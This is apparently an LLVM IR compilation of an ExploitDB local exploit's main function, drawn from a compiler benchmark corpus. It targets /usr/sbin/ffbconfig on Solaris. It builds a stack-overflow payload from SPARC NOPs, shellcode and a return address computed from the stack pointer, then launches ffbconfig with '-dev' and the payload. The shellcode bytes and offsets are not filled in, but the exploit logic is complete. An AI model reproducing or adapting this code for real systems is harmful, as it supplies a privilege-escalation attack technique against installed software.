; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19159.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19159.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LENGTH = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@sparc_shellcode = common dso_local global i32* null, align 8
@SPARC_NOP = common dso_local global i32 0, align 4
@STACK_OFFSET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [45 x i8] c"Jumping to address 0x%lx B[%d] E[%d] SO[%d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"/usr/sbin/ffbconfig\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"ffbconfig\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"-dev\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = load i32, i32* @BUF_LENGTH, align 4
  %14 = load i32, i32* @EXTRA, align 4
  %15 = add nsw i32 %13, %14
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %5, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %6, align 8
  %19 = load i32*, i32** @sparc_shellcode, align 8
  %20 = call i32 @strlen(i32* %19)
  store i32 %20, i32* %11, align 4
  %21 = bitcast i8* %18 to i32*
  store i32* %21, i32** %8, align 8
  store i32 0, i32* %10, align 4
  br label %22

22:                                               ; preds = %35, %2
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = load i32, i32* @BUF_LENGTH, align 4
  %26 = load i32, i32* %11, align 4
  %27 = sub nsw i32 %25, %26
  %28 = sext i32 %27 to i64
  %29 = udiv i64 %28, 4
  %30 = icmp ult i64 %24, %29
  br i1 %30, label %31, label %38

31:                                               ; preds = %22
  %32 = load i32, i32* @SPARC_NOP, align 4
  %33 = load i32*, i32** %8, align 8
  %34 = getelementptr inbounds i32, i32* %33, i32 1
  store i32* %34, i32** %8, align 8
  store i32 %32, i32* %33, align 4
  br label %35

35:                                               ; preds = %31
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %22

38:                                               ; preds = %22
  %39 = load i32*, i32** %8, align 8
  store i32* %39, i32** %9, align 8
  store i32 0, i32* %10, align 4
  br label %40

40:                                               ; preds = %52, %38
  %41 = load i32, i32* %10, align 4
  %42 = load i32, i32* %11, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %55

44:                                               ; preds = %40
  %45 = load i32*, i32** @sparc_shellcode, align 8
  %46 = load i32, i32* %10, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  %49 = load i32, i32* %48, align 4
  %50 = load i32*, i32** %9, align 8
  %51 = getelementptr inbounds i32, i32* %50, i32 1
  store i32* %51, i32** %9, align 8
  store i32 %49, i32* %50, align 4
  br label %52

52:                                               ; preds = %44
  %53 = load i32, i32* %10, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %10, align 4
  br label %40

55:                                               ; preds = %40
  %56 = load i32*, i32** %9, align 8
  store i32* %56, i32** %8, align 8
  %57 = call i64 (...) @get_sp()
  %58 = load i64, i64* @STACK_OFFSET, align 8
  %59 = sub nsw i64 %57, %58
  store i64 %59, i64* %7, align 8
  store i32 0, i32* %10, align 4
  br label %60

60:                                               ; preds = %72, %55
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = load i32, i32* @EXTRA, align 4
  %64 = sext i32 %63 to i64
  %65 = udiv i64 %64, 4
  %66 = icmp ult i64 %62, %65
  br i1 %66, label %67, label %75

67:                                               ; preds = %60
  %68 = load i64, i64* %7, align 8
  %69 = trunc i64 %68 to i32
  %70 = load i32*, i32** %8, align 8
  %71 = getelementptr inbounds i32, i32* %70, i32 1
  store i32* %71, i32** %8, align 8
  store i32 %69, i32* %70, align 4
  br label %72

72:                                               ; preds = %67
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  br label %60

75:                                               ; preds = %60
  %76 = load i64, i64* %7, align 8
  %77 = load i32, i32* @BUF_LENGTH, align 4
  %78 = load i32, i32* @EXTRA, align 4
  %79 = load i64, i64* @STACK_OFFSET, align 8
  %80 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i64 %76, i32 %77, i32 %78, i64 %79)
  %81 = call i32 @execl(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* %18, i8* null)
  %82 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %83 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %83)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i32*) #2

declare dso_local i64 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i64, i32, i32, i64) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
